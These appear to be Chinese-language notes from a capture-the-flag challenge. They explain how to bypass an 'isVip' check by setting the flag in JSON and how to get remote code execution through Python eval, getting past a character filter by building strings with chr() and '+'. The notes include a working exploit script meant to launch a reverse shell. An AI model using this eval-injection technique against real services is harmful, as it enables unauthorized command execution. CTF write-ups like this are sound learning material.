# 思路
	- 绕过`isVip`限制，并利用python eval进行反弹shell
- # 绕过`isVip`限制
	- 题目会将输入的json反序列化`CalculateModel`，使得`isVip`可控，我们只需要传入isVip即可绕过限制
- # python eval反弹shell
	- 题目允许使用英文字母、数字、括号和加号
	- 可以使用`chr`函数配合加号构造任意字符串，并传给eval实现RCE
- # 最终Exp
	- ```python
	  url = "http://891f7411-3837-4f70-bb2e-8f15048b13f5.node4.buuoj.cn:81/calculate"
	  
	  eval_target = """
	  __import__('os').popen({}).read()
	  """.format(repr(reverse_shell_payload))
	  
	  payload = "+".join(f"chr({ord(c)})" for c in f"eval({eval_target!r})")
	  
	  r = base_post(url, json = {
	      "expression": f"eval({payload})",
	      "isVip": True
	  })
	  print(r.text)
	  print(r.headers)
	  ```
- # 施工中
	- 题目接收一个表达式，将其传给nodejs, python和php并分别解析，如果结果相同就返回回显
	- `sleep(5)`可以正常执行
	- 题目frontend接受json并反序列化为`CalculateModel`，这里可以直接通过json将isVip赋值为True
	- 对expression的过滤：
		- ```python
		  regexp = r"^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$"
		  print(re.match(regexp, "123/1") is not None)
		  ```